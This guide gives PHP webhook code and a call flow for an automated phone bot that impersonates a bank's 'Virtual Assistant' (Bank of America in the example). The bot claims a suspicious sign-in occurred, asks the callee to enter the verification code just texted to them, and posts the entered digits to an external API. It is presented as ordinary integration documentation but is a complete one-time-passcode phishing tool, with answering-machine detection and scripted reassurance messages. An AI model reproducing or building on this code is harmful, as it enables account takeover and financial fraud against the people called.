# 🔗 PHP Webhook Integration Guide

## Cara PHP Webhook Membaca Messages dari UI Form

### 📍 Endpoint untuk Get Call Data

```
GET https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/{call_id}
```

**Response:**
```json
{
  "call_id": "abc123",
  "from_number": "+12106749012",
  "to_number": "+14089105678",
  "recipient_name": "John Doe",
  "service_name": "Bank of America",
  "tts_voice": "Aurora",
  "digits": 6,
  "step_1_message": "Hi {{name}}! I'm your Virtual Assistant from {{service}}...",
  "step_2_message": "Alright, we just sent a {{digit}} digit verification code...",
  "step_3_message": "Okay, please wait a moment while we verify the code.",
  "accepted_message": "Okay! We've declined the sign-in request...",
  "rejected_message": "I'm sorry, but the code you entered is incorrect..."
}
```

---

## 📝 PHP Webhook Implementation

### 1. Main Webhook (signalwire-webhook.php)

```php
<?php
/**
 * SignalWire Main Webhook
 * Handles initial call and plays Step 1 Message
 */

header('Content-Type: application/xml');

// Get call_id from query string
$call_id = $_GET['call_id'] ?? null;

if (!$call_id) {
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response><Say>Error: Missing call ID</Say><Hangup/></Response>';
    exit;
}

// Fetch call data from internal API
$api_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code !== 200 || !$response) {
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response><Say>Error retrieving call data</Say><Hangup/></Response>';
    exit;
}

$call_data = json_decode($response, true);

// Extract data
$step_1_message = $call_data['step_1_message'] ?? 'Hello';
$step_2_message = $call_data['step_2_message'] ?? 'Please enter code';
$voice = $call_data['tts_voice'] ?? 'Aurora';
$digits = $call_data['digits'] ?? 6;

// Replace variables in messages
$step_1_message = str_replace('{{name}}', $call_data['recipient_name'] ?? '', $step_1_message);
$step_1_message = str_replace('{{service}}', $call_data['service_name'] ?? '', $step_1_message);
$step_2_message = str_replace('{{digit}}', $digits, $step_2_message);

// Get callback URLs
$base_url = "https://piddly-tenable-frederic.ngrok-free.dev";
$first_input_url = $base_url . "/signalwire-first-input.php?call_id=" . $call_id;

// Generate TwiML
echo '<?xml version="1.0" encoding="UTF-8"?>';
echo '<Response>';
echo '  <Say voice="' . htmlspecialchars($voice) . '">' . htmlspecialchars($step_1_message) . '</Say>';
echo '  <Gather numDigits="1" action="' . htmlspecialchars($first_input_url) . '" method="POST" timeout="10">';
echo '    <Say voice="' . htmlspecialchars($voice) . '">If this was not you, press 1. If it was you, press 0.</Say>';
echo '  </Gather>';
echo '  <Say voice="' . htmlspecialchars($voice) . '">We did not receive any input. Goodbye.</Say>';
echo '  <Hangup/>';
echo '</Response>';
?>
```

### 2. First Input Webhook (signalwire-first-input.php)

```php
<?php
/**
 * Handle first digit input (1 or 0)
 */

header('Content-Type: application/xml');

$call_id = $_GET['call_id'] ?? null;
$digit = $_POST['Digits'] ?? null;

if (!$call_id) {
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response><Say>Error: Missing call ID</Say><Hangup/></Response>';
    exit;
}

$base_url = "https://piddly-tenable-frederic.ngrok-free.dev";

// Route based on digit pressed
if ($digit === '1') {
    // User pressed 1 (deny/block) - redirect to deny webhook
    $deny_url = $base_url . "/signalwire-deny.php?call_id=" . $call_id;
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Redirect>' . htmlspecialchars($deny_url) . '</Redirect>';
    echo '</Response>';
} elseif ($digit === '0') {
    // User pressed 0 (accept/confirm) - redirect to accept webhook
    $accept_url = $base_url . "/signalwire-accept.php?call_id=" . $call_id;
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Redirect>' . htmlspecialchars($accept_url) . '</Redirect>';
    echo '</Response>';
} else {
    // Invalid input
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Say>Invalid input. Please try again.</Say>';
    echo '  <Redirect>' . htmlspecialchars($base_url . "/signalwire-webhook.php?call_id=" . $call_id) . '</Redirect>';
    echo '</Response>';
}
?>
```

### 3. Deny Webhook (signalwire-deny.php)

```php
<?php
/**
 * User pressed 1 (deny) - Gather OTP code
 */

header('Content-Type: application/xml');

$call_id = $_GET['call_id'] ?? null;
$otp_digits = $_POST['Digits'] ?? null;

if (!$call_id) {
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response><Say>Error: Missing call ID</Say><Hangup/></Response>';
    exit;
}

// Fetch call data
$api_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$call_data = json_decode($response, true);
$voice = $call_data['tts_voice'] ?? 'Aurora';
$digits = $call_data['digits'] ?? 6;

// If OTP digits received, send to internal API and play step 3
if ($otp_digits) {
    // Send OTP to internal API
    $update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
    $update_data = [
        'event' => 'digits_received',
        'status' => 'digit_entered',
        'digits' => $otp_digits,
        'timestamp' => date('c')
    ];
    
    $ch = curl_init($update_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($update_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // Play step 3 message and rejected message
    $step_3_message = $call_data['step_3_message'] ?? 'Please wait';
    $rejected_message = $call_data['rejected_message'] ?? 'Thank you';
    $rejected_message = str_replace('{{digit}}', $digits, $rejected_message);
    
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Say voice="' . htmlspecialchars($voice) . '">' . htmlspecialchars($step_3_message) . '</Say>';
    echo '  <Pause length="2"/>';
    echo '  <Say voice="' . htmlspecialchars($voice) . '">' . htmlspecialchars($rejected_message) . '</Say>';
    echo '  <Hangup/>';
    echo '</Response>';
} else {
    // First time - ask for OTP
    $step_2_message = $call_data['step_2_message'] ?? 'Please enter code';
    $step_2_message = str_replace('{{digit}}', $digits, $step_2_message);
    
    $base_url = "https://piddly-tenable-frederic.ngrok-free.dev";
    $gather_url = $base_url . "/signalwire-deny.php?call_id=" . $call_id;
    
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Gather numDigits="' . $digits . '" action="' . htmlspecialchars($gather_url) . '" method="POST" timeout="15">';
    echo '    <Say voice="' . htmlspecialchars($voice) . '">' . htmlspecialchars($step_2_message) . '</Say>';
    echo '  </Gather>';
    echo '  <Say voice="' . htmlspecialchars($voice) . '">We did not receive the code. Goodbye.</Say>';
    echo '  <Hangup/>';
    echo '</Response>';
}
?>
```

### 4. Accept Webhook (signalwire-accept.php)

```php
<?php
/**
 * User pressed 0 (accept) - Play accepted message
 */

header('Content-Type: application/xml');

$call_id = $_GET['call_id'] ?? null;

if (!$call_id) {
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response><Say>Error: Missing call ID</Say><Hangup/></Response>';
    exit;
}

// Fetch call data
$api_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/" . $call_id;
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$call_data = json_decode($response, true);

$accepted_message = $call_data['accepted_message'] ?? 'Thank you for confirming';
$voice = $call_data['tts_voice'] ?? 'Aurora';

// Send update to internal API
$update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
$update_data = [
    'event' => 'call_accepted',
    'status' => 'accepted',
    'timestamp' => date('c')
];

$ch = curl_init($update_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($update_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Play accepted message
echo '<?xml version="1.0" encoding="UTF-8"?>';
echo '<Response>';
echo '  <Say voice="' . htmlspecialchars($voice) . '">' . htmlspecialchars($accepted_message) . '</Say>';
echo '  <Hangup/>';
echo '</Response>';
?>
```

### 5. Status Webhook (signalwire-status.php)

```php
<?php
/**
 * Handle status updates (recording, completion, etc.)
 */

$call_id = $_GET['call_id'] ?? null;
$call_status = $_POST['CallStatus'] ?? null;
$recording_url = $_POST['RecordingUrl'] ?? null;

if ($call_id) {
    // Send status update to internal API
    $update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
    $update_data = [
        'event' => 'status_update',
        'status' => $call_status,
        'recording_url' => $recording_url,
        'timestamp' => date('c')
    ];
    
    $ch = curl_init($update_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($update_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Return empty response (no TwiML needed for status callback)
http_response_code(200);
echo "OK";
?>
```

### 6. AMD Webhook (signalwire-amd.php)

```php
<?php
/**
 * Handle Answering Machine Detection
 */

header('Content-Type: application/xml');

$call_id = $_GET['call_id'] ?? null;
$answered_by = $_POST['AnsweredBy'] ?? 'human';

if (!$call_id) {
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response><Say>Error</Say><Hangup/></Response>';
    exit;
}

// Send AMD result to internal API
$update_url = "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id;
$update_data = [
    'event' => 'amd_result',
    'answered_by' => $answered_by,
    'timestamp' => date('c')
];

$ch = curl_init($update_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($update_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

if ($answered_by === 'machine_start' || $answered_by === 'machine_end_beep') {
    // Voicemail detected - leave message or hangup
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Say>This is an important message. Please call us back.</Say>';
    echo '  <Hangup/>';
    echo '</Response>';
} else {
    // Human detected - continue with main webhook
    $base_url = "https://piddly-tenable-frederic.ngrok-free.dev";
    $main_url = $base_url . "/signalwire-webhook.php?call_id=" . $call_id;
    
    echo '<?xml version="1.0" encoding="UTF-8"?>';
    echo '<Response>';
    echo '  <Redirect>' . htmlspecialchars($main_url) . '</Redirect>';
    echo '</Response>';
}
?>
```

---

## 🔄 Complete Call Flow

```
1. User fills form UI dengan messages:
   - Step 1 Message: "Hi {{name}}! I'm your Virtual Assistant..."
   - Step 2 Message: "Please enter the {{digit}} digit code..."
   - Step 3 Message: "Please wait while we verify..."
   - Accepted Message: "Thank you for confirming..."
   - Rejected Message: "The code is incorrect..."

2. Backend saves ke Firestore dengan call_id

3. SignalWire calls PHP webhook dengan ?call_id=xxx

4. PHP webhook:
   GET /api/webhooks/external/call/{call_id}
   → Retrieves all messages from database

5. PHP generates TwiML using messages:
   <Say voice="Aurora">{step_1_message}</Say>

6. SignalWire plays voice reading the text from UI form

7. User interacts (press 1/0, enter OTP)

8. PHP webhook uses appropriate message for each step
```

---

## ✅ Testing

### Test Get Call Data:
```bash
curl https://callbot-research.preview.emergentagent.com/api/webhooks/external/call/test123
```

### Test PHP Webhook:
```bash
curl "https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php?call_id=test123"
```

Should return TwiML with Step 1 message.

---

## 🎯 Key Points

1. ✅ **PHP webhook ALWAYS gets latest messages** from database via API
2. ✅ **Variables replaced:** `{{name}}`, `{{service}}`, `{{digit}}`
3. ✅ **Voice uses TTS voice** from form (Aurora, Chirp HD, etc.)
4. ✅ **All 5 messages used** in appropriate flow steps
5. ✅ **Real-time:** Changes in UI form immediately reflected in next call

---

**Last Updated:** 2024-11-25
